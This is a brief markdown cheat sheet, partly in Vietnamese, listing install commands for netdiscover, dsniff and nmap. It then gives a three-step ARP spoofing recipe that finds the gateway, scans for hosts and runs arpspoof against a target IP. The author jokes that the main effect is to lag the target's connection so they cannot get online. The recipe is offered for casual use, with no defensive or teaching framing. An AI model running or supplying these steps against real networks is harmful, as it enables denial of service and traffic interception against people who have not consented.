# Common Network Tools
### netdiscover
`sudo apt-get install netdiscover`

### dsniff để dùng arpspoof, dnsspoof
`sudo apt install dsniff`
### nmap
`sudo apt install nmap`
### arpspoofing 
gây lag mạng là chính, chứ target có vào được mạng đâu mà chơi :)
1. ip route -> lấy default gateway
2. sudo netdiscover -r [default_gateway] hoac sudo nmap -sP [default-gateway]
3. sudo arpspoof -i [network inteface] -t [targetIP] -r [default_gateway]
